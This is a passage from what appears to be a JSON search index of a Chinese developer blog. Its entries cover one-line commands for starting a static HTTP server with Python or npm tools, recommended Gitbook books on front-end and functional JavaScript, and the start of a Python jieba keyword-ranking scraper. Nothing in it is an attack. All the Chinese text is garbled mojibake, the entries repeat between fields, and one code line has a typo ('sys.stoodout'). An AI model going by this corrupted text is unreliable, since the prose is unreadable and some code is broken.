æœ¬è´¨ä¸Šä¸è¿‡æ˜¯è¯­æ³•ç³–ï¼Œå®ƒè´Ÿè´£ç›‘å¬ç”¨æˆ·çš„è¾“å…¥äº‹ä»¶ä»¥æ›´æ–°æ•°æ®ï¼Œå¹¶ç‰¹åˆ«å¤„ç†ä¸€äº›æç«¯çš„ä¾‹å­ã€‚","title":"æˆ‘è‹¦è‹¦å¯»æ‰¾è¯¡å¼‚çš„bugåŸå› ï¼Œå…¶å®æ˜¯æˆ‘çš„æ— çŸ¥"},{"content":"ç®€æ˜“æœåŠ¡å™¨ï¼šåœ¨å‘½ä»¤æ‰§è¡Œçš„æ‰€åœ¨è·¯å¾„å¯åŠ¨ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œç„¶åä½ å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®è¯¥è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚\nåœ¨å±€åŸŸç½‘å†…ä¼ æ–‡ä»¶ï¼Œæˆ–è€…è‡ªå·±æµ‹è¯•ä½¿ç”¨éƒ½æ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚\n1. åŸºäºpython 1.1. åŸºäºPython2 python -m SimpleHTTPServer port\n\u0026gt; python -m SimpleHTTPServer 8099 Serving HTTP on 0.0.0.0 port 8099 ... 127.0.0.1 - - [24/Oct/2017 11:07:56] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 1.2. åŸºäºpython3 python3 -m http.server port\n\u0026gt; python3 -m http.server 8099 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ... 127.0.0.1 - - [24/Oct/2017 11:05:06] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 127.0.0.1 - - [24/Oct/2017 11:05:06] code 404, message File not found 127.0.0.1 - - [24/Oct/2017 11:05:06] \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34; 404 - 2. åŸºäºnodejs é¦–å…ˆä½ è¦å®‰è£…nodejs\n2.1. http-server // å®‰è£… npm install http-server -g // ç”¨æ³• http-server [path] [options] 2.2. serve // å®‰è£… npm install -g serve // ç”¨æ³• serve [options] \u0026lt;path\u0026gt; 2.3. webpack-dev-server // å®‰è£… npm install webpack-dev-server -g // ç”¨æ³• webpack-dev-server 2.4. anywhere // å®‰è£… npm install -g anywhere // ç”¨æ³• anywhere anywhere -p port 2.5. puer // å®‰è£… npm -g install puer // ä½¿ç”¨ puer - æä¾›ä¸€ä¸ªå½“å‰æˆ–æŒ‡å®šè·¯å¾„çš„é™æ€æœåŠ¡å™¨ - æ‰€æœ‰æµè§ˆå™¨çš„å®æ—¶åˆ·æ–°ï¼šç¼–è¾‘csså®æ—¶æ›´æ–°(update)é¡µé¢æ ·å¼ï¼Œå…¶å®ƒæ–‡ä»¶åˆ™é‡è½½(reload)é¡µé¢ - æä¾›ç®€å•ç†Ÿæ‚‰çš„mockè¯·æ±‚çš„é…ç½®åŠŸèƒ½ï¼Œå¹¶ä¸”é…ç½®ä¹Ÿæ˜¯è‡ªåŠ¨æ›´æ–°ã€‚ - å¯ç”¨ä½œä»£ç†æœåŠ¡å™¨ï¼Œè°ƒè¯•å¼€å‘æ—¢æœ‰æœåŠ¡å™¨çš„é¡µé¢ï¼Œå¯ä¸mockåŠŸèƒ½é…åˆä½¿ç”¨ - é›†æˆäº†weinreï¼Œå¹¶æä¾›äºŒç»´ç åœ°å€ï¼Œæ–¹ä¾¿ç§»åŠ¨ç«¯çš„è°ƒè¯• - å¯ä»¥ä½œä¸ºconnectä¸­é—´ä»¶ä½¿ç”¨(å‰ææ˜¯åç«¯ä¸ºnodejsï¼Œå¦åˆ™è¯·ä½¿ç”¨ä»£ç†æ¨¡å¼) ","permalink":"https://wdd.js.org/posts/2019/10/hvqggd/","summary":"ç®€æ˜“æœåŠ¡å™¨ï¼šåœ¨å‘½ä»¤æ‰§è¡Œçš„æ‰€åœ¨è·¯å¾„å¯åŠ¨ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œç„¶åä½ å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®è¯¥è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚\nåœ¨å±€åŸŸç½‘å†…ä¼ æ–‡ä»¶ï¼Œæˆ–è€…è‡ªå·±æµ‹è¯•ä½¿ç”¨éƒ½æ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚\n1. åŸºäºpython 1.1. åŸºäºPython2 python -m SimpleHTTPServer port\n\u0026gt; python -m SimpleHTTPServer 8099 Serving HTTP on 0.0.0.0 port 8099 ... 127.0.0.1 - - [24/Oct/2017 11:07:56] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 1.2. åŸºäºpython3 python3 -m http.server port\n\u0026gt; python3 -m http.server 8099 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ... 127.0.0.1 - - [24/Oct/2017 11:05:06] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 127.0.0.1 - - [24/Oct/2017 11:05:06] code 404, message File not found 127.","title":"ä¸€è¡Œå‘½ä»¤æ­å»ºç®€æ˜“é™æ€æ–‡ä»¶httpæœåŠ¡å™¨"},{"content":"1. Front-End Developer Handbook 2017 åœ°å€ï¼šhttps://frontendmasters.com/books/front-end-handbook/2017/ è¿™æ˜¯ä»»ä½•äººéƒ½å¯ä»¥ç”¨æ¥äº†è§£å‰ç«¯å¼€å‘å®è·µçš„æŒ‡å—ã€‚å®ƒå¤§è‡´æ¦‚è¿°å¹¶è®¨è®ºäº†å‰ç«¯å·¥ç¨‹çš„å®è·µï¼šå¦‚ä½•å­¦ä¹ å®ƒï¼Œä»¥åŠåœ¨2017å¹´å®è·µæ—¶ä½¿ç”¨ä»€ä¹ˆå·¥å…·ã€‚\nè¿™æ˜¯ä¸“é—¨ä¸ºæ½œåœ¨çš„å’Œç›®å‰å®è·µçš„å‰ç«¯å¼€å‘äººå‘˜æä¾›ä¸“ä¸šèµ„æºï¼Œä»¥é…å¤‡å­¦ä¹ ææ–™å’Œå¼€å‘å·¥å…·ã€‚å…¶æ¬¡ï¼Œç®¡ç†è€…ï¼Œé¦–å¸­æŠ€æœ¯å®˜ï¼Œå¯¼å¸ˆå’ŒçŒå¤´äººå£«å¯ä»¥ä½¿ç”¨å®ƒæ¥äº†è§£å‰ç«¯å¼€å‘çš„å®è·µã€‚\næ‰‹å†Œçš„å†…å®¹æœ‰åˆ©äºç½‘ç»œæŠ€æœ¯ï¼ˆHTMLï¼ŒCSSï¼ŒDOMå’ŒJavaScriptï¼‰ä»¥åŠç›´æ¥æ„å»ºåœ¨è¿™äº›å¼€æ”¾æŠ€æœ¯ä¹‹ä¸Šçš„è§£å†³æ–¹æ¡ˆã€‚æœ¬ä¹¦ä¸­å¼•ç”¨å’Œè®¨è®ºçš„ææ–™æ˜¯è¯¾å ‚ä¸Šæœ€å¥½çš„æˆ–ç›®å‰æå‡ºçš„é—®é¢˜ã€‚\nè¯¥ä¹¦ä¸åº”è¢«è§†ä¸ºå¯¹å‰ç«¯å¼€å‘äººå‘˜å¯ç”¨çš„æ‰€æœ‰èµ„æºçš„å…¨é¢æ¦‚è¿°ã€‚è¿™æœ¬ä¹¦çš„ä»·å€¼è¢«ç®€å•ï¼Œé›†ä¸­å’ŒåŠæ—¶åœ°ç»„ç»‡èµ·æ¥ï¼Œä»…ä»…æ˜¯è¶³å¤Ÿçš„ç»å¯¹ä¿¡æ¯ï¼Œä»¥å…ä»»ä½•äººåœ¨ä»»ä½•ä¸€ä¸ªç‰¹å®šçš„ä¸»é¢˜ä¸Šå‹å€’ä¸€åˆ‡ã€‚\nç›®çš„æ˜¯æ¯å¹´å‘å¸ƒä¸€æ¬¡å†…å®¹æ›´æ–°ã€‚\næ‰‹å†Œåˆ†ä¸ºä¸‰éƒ¨åˆ†ã€‚\nç¬¬ä¸€éƒ¨åˆ†ã€‚å‰ç«¯å®è·µ\nç¬¬ä¸€éƒ¨åˆ†å¹¿æ³›æè¿°äº†å‰ç«¯å·¥ç¨‹çš„å®è·µã€‚\nç¬¬äºŒéƒ¨åˆ†ï¼šå­¦ä¹ å‰ç«¯å‘å±•\nç¬¬äºŒéƒ¨åˆ†æŒ‡å‡ºäº†è‡ªä¸»å¯¼å‘å’Œç›´æ¥çš„èµ„æºï¼Œç”¨äºå­¦ä¹ æˆä¸ºå‰ç«¯å¼€å‘äººå‘˜ã€‚\nç¬¬ä¸‰éƒ¨åˆ†ï¼šå‰ç«¯å¼€å‘å·¥å…·\nç¬¬ä¸‰éƒ¨åˆ†ç®€è¦è§£é‡Šå’Œè¯†åˆ«äº¤æ˜“å·¥å…·ã€‚\n2. JSå‡½æ•°å¼ç¼–ç¨‹æŒ‡å— è‹±æ–‡ç‰ˆåœ°å€ï¼š ä¸­æ–‡ç‰ˆåœ°å€ï¼šhttps://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/\nè¿™æœ¬ä¹¦çš„ä¸»é¢˜æ˜¯å‡½æ•°èŒƒå¼ï¼ˆfunctional paradigmï¼‰ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ JavaScript è¿™ä¸ªä¸–ç•Œä¸Šæœ€æµè¡Œçš„å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€æ¥è®²è¿°è¿™ä¸€ä¸»é¢˜ã€‚æœ‰äººå¯èƒ½ä¼šè§‰å¾—é€‰æ‹© JavaScript å¹¶ä¸æ˜æ™ºï¼Œå› ä¸ºå½“å‰çš„ä¸»æµè§‚ç‚¹è®¤ä¸ºå®ƒæ˜¯ä¸€é—¨å‘½ä»¤å¼ï¼ˆimperativeï¼‰çš„è¯­è¨€ï¼Œå¹¶ä¸é€‚åˆç”¨æ¥è®²å‡½æ•°å¼ã€‚ä½†æˆ‘è®¤ä¸ºï¼Œè¿™æ˜¯å­¦ä¹ å‡½æ•°å¼ç¼–ç¨‹çš„æœ€å¥½æ–¹å¼ï¼Œå› ä¸ºï¼š\nä½ å¾ˆæœ‰å¯èƒ½åœ¨æ—¥å¸¸å·¥ä½œä¸­ä½¿ç”¨å®ƒ\nè¿™è®©ä½ æœ‰æœºä¼šåœ¨å®é™…çš„ç¼–ç¨‹è¿‡ç¨‹ä¸­å­¦ä»¥è‡´ç”¨ï¼Œè€Œä¸æ˜¯åœ¨ç©ºé—²æ—¶é—´ç”¨ä¸€é—¨æ·±å¥¥çš„å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€åšä¸€äº›ç©å…·æ€§è´¨çš„é¡¹ç›®ã€‚\nä½ ä¸å¿…ä»å¤´å­¦èµ·å°±èƒ½å¼€å§‹ç¼–å†™ç¨‹åº\nåœ¨çº¯å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œä½ å¿…é¡»ä½¿ç”¨ monad æ‰èƒ½æ‰“å°å˜é‡æˆ–è€…è¯»å– DOM èŠ‚ç‚¹ã€‚JavaScript åˆ™ç®€å•å¾—å¤šï¼Œå¯ä»¥ä½œå¼Šèµ°æ·å¾„ï¼Œå› ä¸ºæ¯•ç«Ÿæˆ‘ä»¬çš„ç›®çš„æ˜¯å­¦å†™çº¯å‡½æ•°å¼ä»£ç ã€‚JavaScript ä¹Ÿæ›´å®¹æ˜“å…¥é—¨ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€é—¨æ··åˆèŒƒå¼çš„è¯­è¨€ï¼Œä½ éšæ—¶å¯ä»¥åœ¨æ„Ÿè§‰åƒåŠ›çš„æ—¶å€™å›é€€åˆ°åŸæœ‰çš„ç¼–ç¨‹ä¹ æƒ¯ä¸Šå»ã€‚\nè¿™é—¨è¯­è¨€å®Œå…¨æœ‰èƒ½åŠ›ä¹¦å†™é«˜çº§çš„å‡½æ•°å¼ä»£ç \nåªéœ€å€ŸåŠ©ä¸€åˆ°ä¸¤ä¸ªå¾®å‹ç±»åº“ï¼ŒJavaScript å°±èƒ½æ¨¡æ‹Ÿ Scala æˆ– Haskell è¿™ç±»è¯­è¨€çš„å…¨éƒ¨ç‰¹æ€§ã€‚è™½ç„¶é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆObject-oriented programingï¼‰ä¸»å¯¼ç€ä¸šç•Œï¼Œä½†å¾ˆæ˜æ˜¾è¿™ç§èŒƒå¼åœ¨ JavaScript é‡Œéå¸¸ç¬¨æ‹™ï¼Œç”¨èµ·æ¥å°±åƒåœ¨é«˜é€Ÿå…¬è·¯ä¸Šéœ²è¥æˆ–è€…ç©¿ç€æ©¡èƒ¶å¥—é‹è·³è¸¢è¸èˆä¸€æ ·ã€‚æˆ‘ä»¬ä¸å¾—ä¸åˆ°å¤„ä½¿ç”¨ bind ä»¥å… this ä¸çŸ¥ä¸è§‰åœ°å˜äº†ï¼Œè¯­è¨€é‡Œæ²¡æœ‰ç±»å¯ä»¥ç”¨ï¼ˆç›®å‰è¿˜æ²¡æœ‰ï¼‰ï¼Œæˆ‘ä»¬è¿˜å‘æ˜äº†å„ç§å˜é€šæ–¹æ³•æ¥åº”å¯¹å¿˜è®°è°ƒç”¨ new å…³é”®å­—åçš„æ€ªå¼‚è¡Œä¸ºï¼Œç§æœ‰æˆå‘˜åªèƒ½é€šè¿‡é—­åŒ…ï¼ˆclosureï¼‰æ‰èƒ½å®ç°ï¼Œç­‰ç­‰ã€‚å¯¹å¤§å¤šæ•°äººæ¥è¯´ï¼Œå‡½æ•°å¼ç¼–ç¨‹çœ‹èµ·æ¥æ›´åŠ è‡ªç„¶ã€‚+\nä»¥ä¸Šè¯´æ˜ï¼Œå¼ºç±»å‹çš„å‡½æ•°å¼è¯­è¨€æ¯«æ— ç–‘é—®å°†ä¼šæˆä¸ºæœ¬ä¹¦æ‰€ç¤ºèŒƒå¼çš„æœ€ä½³è¯•éªŒåœºã€‚JavaScript æ˜¯æˆ‘ä»¬å­¦ä¹ è¿™ç§èŒƒå¼çš„ä¸€ç§æ‰‹æ®µï¼Œå°†å®ƒåº”ç”¨äºä»€ä¹ˆåœ°æ–¹åˆ™å®Œå…¨å–å†³äºä½ è‡ªå·±ã€‚å¹¸è¿çš„æ˜¯ï¼Œæ‰€æœ‰çš„æ¥å£éƒ½æ˜¯æ•°å­¦çš„ï¼Œå› è€Œä¹Ÿæ˜¯æ™®é€‚çš„ã€‚æœ€ç»ˆä½ ä¼šå‘ç°ä½ ä¹ æƒ¯äº† swiftzã€scalazã€haskell å’Œ purescriptï¼Œä»¥åŠå…¶ä»–å„ç§æ•°å­¦åå‘çš„è¯­è¨€ã€‚\n3. å‰ç«¯å¼€å‘ç¬”è®°æœ¬ åœ°å€ï¼šhttp://chanshuyi.github.io/frontend_notebook/\nå‰ç«¯å¼€å‘ç¬”è®°æœ¬æ¶µæ‹¬äº†å¤§éƒ¨åˆ†å‰ç«¯å¼€å‘æ‰€éœ€çš„çŸ¥è¯†ç‚¹ï¼Œä¸»è¦åŒ…æ‹¬5å¤§éƒ¨åˆ†ï¼šã€Šé¡µé¢åˆ¶ä½œã€‹ã€ã€ŠJavaScriptç¨‹åºè®¾è®¡ã€‹ã€ã€ŠDOMç¼–ç¨‹ã€‹ã€ã€Šé¡µé¢æ¶æ„ã€‹ã€ã€Šå‰ç«¯äº§å“æ¶æ„ã€‹ã€‚\n","permalink":"https://wdd.js.org/fe/gitbook-good-book/","summary":"1. Front-End Developer Handbook 2017 åœ°å€ï¼šhttps://frontendmasters.com/books/front-end-handbook/2017/ è¿™æ˜¯ä»»ä½•äººéƒ½å¯ä»¥ç”¨æ¥äº†è§£å‰ç«¯å¼€å‘å®è·µçš„æŒ‡å—ã€‚å®ƒå¤§è‡´æ¦‚è¿°å¹¶è®¨è®ºäº†å‰ç«¯å·¥ç¨‹çš„å®è·µï¼šå¦‚ä½•å­¦ä¹ å®ƒï¼Œä»¥åŠåœ¨2017å¹´å®è·µæ—¶ä½¿ç”¨ä»€ä¹ˆå·¥å…·ã€‚\nè¿™æ˜¯ä¸“é—¨ä¸ºæ½œåœ¨çš„å’Œç›®å‰å®è·µçš„å‰ç«¯å¼€å‘äººå‘˜æä¾›ä¸“ä¸šèµ„æºï¼Œä»¥é…å¤‡å­¦ä¹ ææ–™å’Œå¼€å‘å·¥å…·ã€‚å…¶æ¬¡ï¼Œç®¡ç†è€…ï¼Œé¦–å¸­æŠ€æœ¯å®˜ï¼Œå¯¼å¸ˆå’ŒçŒå¤´äººå£«å¯ä»¥ä½¿ç”¨å®ƒæ¥äº†è§£å‰ç«¯å¼€å‘çš„å®è·µã€‚\næ‰‹å†Œçš„å†…å®¹æœ‰åˆ©äºç½‘ç»œæŠ€æœ¯ï¼ˆHTMLï¼ŒCSSï¼ŒDOMå’ŒJavaScriptï¼‰ä»¥åŠç›´æ¥æ„å»ºåœ¨è¿™äº›å¼€æ”¾æŠ€æœ¯ä¹‹ä¸Šçš„è§£å†³æ–¹æ¡ˆã€‚æœ¬ä¹¦ä¸­å¼•ç”¨å’Œè®¨è®ºçš„ææ–™æ˜¯è¯¾å ‚ä¸Šæœ€å¥½çš„æˆ–ç›®å‰æå‡ºçš„é—®é¢˜ã€‚\nè¯¥ä¹¦ä¸åº”è¢«è§†ä¸ºå¯¹å‰ç«¯å¼€å‘äººå‘˜å¯ç”¨çš„æ‰€æœ‰èµ„æºçš„å…¨é¢æ¦‚è¿°ã€‚è¿™æœ¬ä¹¦çš„ä»·å€¼è¢«ç®€å•ï¼Œé›†ä¸­å’ŒåŠæ—¶åœ°ç»„ç»‡èµ·æ¥ï¼Œä»…ä»…æ˜¯è¶³å¤Ÿçš„ç»å¯¹ä¿¡æ¯ï¼Œä»¥å…ä»»ä½•äººåœ¨ä»»ä½•ä¸€ä¸ªç‰¹å®šçš„ä¸»é¢˜ä¸Šå‹å€’ä¸€åˆ‡ã€‚\nç›®çš„æ˜¯æ¯å¹´å‘å¸ƒä¸€æ¬¡å†…å®¹æ›´æ–°ã€‚\næ‰‹å†Œåˆ†ä¸ºä¸‰éƒ¨åˆ†ã€‚\nç¬¬ä¸€éƒ¨åˆ†ã€‚å‰ç«¯å®è·µ\nç¬¬ä¸€éƒ¨åˆ†å¹¿æ³›æè¿°äº†å‰ç«¯å·¥ç¨‹çš„å®è·µã€‚\nç¬¬äºŒéƒ¨åˆ†ï¼šå­¦ä¹ å‰ç«¯å‘å±•\nç¬¬äºŒéƒ¨åˆ†æŒ‡å‡ºäº†è‡ªä¸»å¯¼å‘å’Œç›´æ¥çš„èµ„æºï¼Œç”¨äºå­¦ä¹ æˆä¸ºå‰ç«¯å¼€å‘äººå‘˜ã€‚\nç¬¬ä¸‰éƒ¨åˆ†ï¼šå‰ç«¯å¼€å‘å·¥å…·\nç¬¬ä¸‰éƒ¨åˆ†ç®€è¦è§£é‡Šå’Œè¯†åˆ«äº¤æ˜“å·¥å…·ã€‚\n2. JSå‡½æ•°å¼ç¼–ç¨‹æŒ‡å— è‹±æ–‡ç‰ˆåœ°å€ï¼š ä¸­æ–‡ç‰ˆåœ°å€ï¼šhttps://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/\nè¿™æœ¬ä¹¦çš„ä¸»é¢˜æ˜¯å‡½æ•°èŒƒå¼ï¼ˆfunctional paradigmï¼‰ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ JavaScript è¿™ä¸ªä¸–ç•Œä¸Šæœ€æµè¡Œçš„å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€æ¥è®²è¿°è¿™ä¸€ä¸»é¢˜ã€‚æœ‰äººå¯èƒ½ä¼šè§‰å¾—é€‰æ‹© JavaScript å¹¶ä¸æ˜æ™ºï¼Œå› ä¸ºå½“å‰çš„ä¸»æµè§‚ç‚¹è®¤ä¸ºå®ƒæ˜¯ä¸€é—¨å‘½ä»¤å¼ï¼ˆimperativeï¼‰çš„è¯­è¨€ï¼Œå¹¶ä¸é€‚åˆç”¨æ¥è®²å‡½æ•°å¼ã€‚ä½†æˆ‘è®¤ä¸ºï¼Œè¿™æ˜¯å­¦ä¹ å‡½æ•°å¼ç¼–ç¨‹çš„æœ€å¥½æ–¹å¼ï¼Œå› ä¸ºï¼š\nä½ å¾ˆæœ‰å¯èƒ½åœ¨æ—¥å¸¸å·¥ä½œä¸­ä½¿ç”¨å®ƒ\nè¿™è®©ä½ æœ‰æœºä¼šåœ¨å®é™…çš„ç¼–ç¨‹è¿‡ç¨‹ä¸­å­¦ä»¥è‡´ç”¨ï¼Œè€Œä¸æ˜¯åœ¨ç©ºé—²æ—¶é—´ç”¨ä¸€é—¨æ·±å¥¥çš„å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€åšä¸€äº›ç©å…·æ€§è´¨çš„é¡¹ç›®ã€‚\nä½ ä¸å¿…ä»å¤´å­¦èµ·å°±èƒ½å¼€å§‹ç¼–å†™ç¨‹åº\nåœ¨çº¯å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œä½ å¿…é¡»ä½¿ç”¨ monad æ‰èƒ½æ‰“å°å˜é‡æˆ–è€…è¯»å– DOM èŠ‚ç‚¹ã€‚JavaScript åˆ™ç®€å•å¾—å¤šï¼Œå¯ä»¥ä½œå¼Šèµ°æ·å¾„ï¼Œå› ä¸ºæ¯•ç«Ÿæˆ‘ä»¬çš„ç›®çš„æ˜¯å­¦å†™çº¯å‡½æ•°å¼ä»£ç ã€‚JavaScript ä¹Ÿæ›´å®¹æ˜“å…¥é—¨ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€é—¨æ··åˆèŒƒå¼çš„è¯­è¨€ï¼Œä½ éšæ—¶å¯ä»¥åœ¨æ„Ÿè§‰åƒåŠ›çš„æ—¶å€™å›é€€åˆ°åŸæœ‰çš„ç¼–ç¨‹ä¹ æƒ¯ä¸Šå»ã€‚\nè¿™é—¨è¯­è¨€å®Œå…¨æœ‰èƒ½åŠ›ä¹¦å†™é«˜çº§çš„å‡½æ•°å¼ä»£ç \nåªéœ€å€ŸåŠ©ä¸€åˆ°ä¸¤ä¸ªå¾®å‹ç±»åº“ï¼ŒJavaScript å°±èƒ½æ¨¡æ‹Ÿ Scala æˆ– Haskell è¿™ç±»è¯­è¨€çš„å…¨éƒ¨ç‰¹æ€§ã€‚è™½ç„¶é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆObject-oriented programingï¼‰ä¸»å¯¼ç€ä¸šç•Œï¼Œä½†å¾ˆæ˜æ˜¾è¿™ç§èŒƒå¼åœ¨ JavaScript é‡Œéå¸¸ç¬¨æ‹™ï¼Œç”¨èµ·æ¥å°±åƒåœ¨é«˜é€Ÿå…¬è·¯ä¸Šéœ²è¥æˆ–è€…ç©¿ç€æ©¡èƒ¶å¥—é‹è·³è¸¢è¸èˆä¸€æ ·ã€‚æˆ‘ä»¬ä¸å¾—ä¸åˆ°å¤„ä½¿ç”¨ bind ä»¥å… this ä¸çŸ¥ä¸è§‰åœ°å˜äº†ï¼Œè¯­è¨€é‡Œæ²¡æœ‰ç±»å¯ä»¥ç”¨ï¼ˆç›®å‰è¿˜æ²¡æœ‰ï¼‰ï¼Œæˆ‘ä»¬è¿˜å‘æ˜äº†å„ç§å˜é€šæ–¹æ³•æ¥åº”å¯¹å¿˜è®°è°ƒç”¨ new å…³é”®å­—åçš„æ€ªå¼‚è¡Œä¸ºï¼Œç§æœ‰æˆå‘˜åªèƒ½é€šè¿‡é—­åŒ…ï¼ˆclosureï¼‰æ‰èƒ½å®ç°ï¼Œç­‰ç­‰ã€‚å¯¹å¤§å¤šæ•°äººæ¥è¯´ï¼Œå‡½æ•°å¼ç¼–ç¨‹çœ‹èµ·æ¥æ›´åŠ è‡ªç„¶ã€‚+\nä»¥ä¸Šè¯´æ˜ï¼Œå¼ºç±»å‹çš„å‡½æ•°å¼è¯­è¨€æ¯«æ— ç–‘é—®å°†ä¼šæˆä¸ºæœ¬ä¹¦æ‰€ç¤ºèŒƒå¼çš„æœ€ä½³è¯•éªŒåœºã€‚JavaScript æ˜¯æˆ‘ä»¬å­¦ä¹ è¿™ç§èŒƒå¼çš„ä¸€ç§æ‰‹æ®µï¼Œå°†å®ƒåº”ç”¨äºä»€ä¹ˆåœ°æ–¹åˆ™å®Œå…¨å–å†³äºä½ è‡ªå·±ã€‚å¹¸è¿çš„æ˜¯ï¼Œæ‰€æœ‰çš„æ¥å£éƒ½æ˜¯æ•°å­¦çš„ï¼Œå› è€Œä¹Ÿæ˜¯æ™®é€‚çš„ã€‚æœ€ç»ˆä½ ä¼šå‘ç°ä½ ä¹ æƒ¯äº† swiftzã€scalazã€haskell å’Œ purescriptï¼Œä»¥åŠå…¶ä»–å„ç§æ•°å­¦åå‘çš„è¯­è¨€ã€‚\n3. å‰ç«¯å¼€å‘ç¬”è®°æœ¬ åœ°å€ï¼šhttp://chanshuyi.github.io/frontend_notebook/\nå‰ç«¯å¼€å‘ç¬”è®°æœ¬æ¶µæ‹¬äº†å¤§éƒ¨åˆ†å‰ç«¯å¼€å‘æ‰€éœ€çš„çŸ¥è¯†ç‚¹ï¼Œä¸»è¦åŒ…æ‹¬5å¤§éƒ¨åˆ†ï¼šã€Šé¡µé¢åˆ¶ä½œã€‹ã€ã€ŠJavaScriptç¨‹åºè®¾è®¡ã€‹ã€ã€ŠDOMç¼–ç¨‹ã€‹ã€ã€Šé¡µé¢æ¶æ„ã€‹ã€ã€Šå‰ç«¯äº§å“æ¶æ„ã€‹ã€‚","title":"Gitbookå¥½ä¹¦æ¨è"},{"content":"1. ç¯å¢ƒ win7 64ä½ python 3.5 2. ç›®æ ‡ æŠ“å–ä¸€ç¯‡æŠ¥çº¸ï¼Œå¹¶æå–å‡ºå…³é”®å­—ï¼Œç„¶åæŒ‰ç…§å‡ºç°æ¬¡æ•°æ’åºï¼Œç”¨echartsåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå‡ºæ¥ã€‚\n3. å·¥å…·é€‰æ‹© å› ä¸ºä¹‹å‰å¯¹nodejsçš„ç›¸å…³å·¥å…·æ¯”è¾ƒç†Ÿæ‚‰ï¼Œåœ¨ç”¨pythonçš„æ—¶å€™ï¼Œä¹Ÿæƒ³æœ‰ç±»ä¼¼çš„å·¥å…·ã€‚æ‰€ä»¥å°±åšäº†ä¸€ä¸ªå¯¹æ¯”çš„è¡¨æ ¼ã€‚\nåŠŸèƒ½ nodejsç‰ˆ pythonç‰ˆ httpå·¥å…· request requests ä¸­æ–‡åˆ†è¯å·¥å…· node-segment, nodejieba(ä¸€ç›´æ²¡æœ‰å®‰è£…æˆåŠŸè¿‡) jieba(åˆ†è¯å‡†ç¡®åº¦æ¯”node-segmentå¥½) DOMè§£æå·¥å…· cheeio pyquery(è¿™ä¸¤ä¸ªå·¥å…·éƒ½æ˜¯æœ‰ç±»ä¼¼jQueryé‚£ç§é€‰æ‹©DOMçš„æ¥å£ï¼Œå¾ˆæ–¹ä¾¿) å‡½æ•°ç¼–ç¨‹å·¥å…· underscore.js underscore.py(underscoreæ¥å¤„ç†é›†åˆæ¯”è¾ƒæ–¹ä¾¿) æœåŠ¡å™¨ express flask 4. å¼€å§‹çš„å™©æ¢¦ï¼šä¸­æ–‡ä¹±ç  æ„Ÿè§‰æ¯ä¸ªå­¦pythonçš„äººéƒ½é‡åˆ°è¿‡ä¸­æ–‡ä¹±ç çš„é—®é¢˜ã€‚æˆ‘ä¹Ÿä¸ä¾‹å¤–ã€‚\né¦–å…ˆè¦æŠ“å–ç½‘é¡µï¼Œä½†æ˜¯ç½‘é¡µåœ¨æ§åˆ¶å°è¾“å‡ºçš„æ—¶å€™ï¼Œä¸­æ–‡æ€»æ˜¯ä¹±ç ã€‚æäº†å¥½ä¹…ï¼Œæå¾—æˆ‘å·®ç‚¹è¦æ”¾å¼ƒpythonã€‚æœ€ç»ˆæ‰¾åˆ°è§£å†³æ–¹æ³•ã€‚ è§£å†³python3 UnicodeEncodeError: \u0026lsquo;gbk\u0026rsquo; codec can\u0026rsquo;t encode character \u0026lsquo;\\xXX\u0026rsquo; in position XX\nè¿‡ç¨‹å¾ˆè‰°è¾›ï¼Œä½†æ˜¯ä»ä¸­ä¹Ÿå­¦åˆ°å¾ˆå¤šçŸ¥è¯†ã€‚\nimport io import sys sys.stdout = io.TextIOWrapper(sys.stoodout.buffer,encoding=\u0026#39;gb18030\u0026#39;) 5. å‡½æ•°å¼ç¼–ç¨‹ï¼š é¡ºäº«ä¸æ»‘ #filename word_rank.py import requests import io import re import sys import jieba as _jieba # ä¸­æ–‡åˆ†è¯æ¯”è¾ƒä¼˜ç§€çš„ä¸€ä¸ªåº“ from pyquery import PyQuery as pq #ç±»ä¼¼äºjqueryã€cheerioçš„åº“ from underscore import _ # underscore.js pythonç‰ˆæœ¬ sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=\u0026#39;gb18030\u0026#39;) # è§£å†³æ§åˆ¶å°ä¸­æ–‡ä¹±ç  USELESSWORDS = [\u0026#39;çš„\u0026#39;,\u0026#39;è¦\u0026#39;,\u0026#39;äº†\u0026#39;,\u0026#39;åœ¨\u0026#39;,\u0026#39;å’Œ\u0026#39;,\u0026#39;æ˜¯\u0026#39;,\u0026#39;æŠŠ\u0026#39;,\u0026#39;å‘\u0026#39;,\u0026#39;ä¸Š\u0026#39;,\u0026#39;ä¸º\u0026#39;,\u0026#39;ç­‰\u0026#39;,\u0026#39;ä¸ª\u0026#39;] # æ ‡è®°ä¸€äº›æ— ç”¨çš„å•è¯ TOP = 30 # åªè¦å‰é¢çš„30ä¸ªå°±å¯ä»¥äº† def _remove_punctuation(line): # ç§»é™¤éä¸­æ–‡å­—ç¬¦ # rule = re.compile(\u0026#34;[^a-zA-Z0-9\\u4e00-\\u9fa5]\u0026#34;) rule = 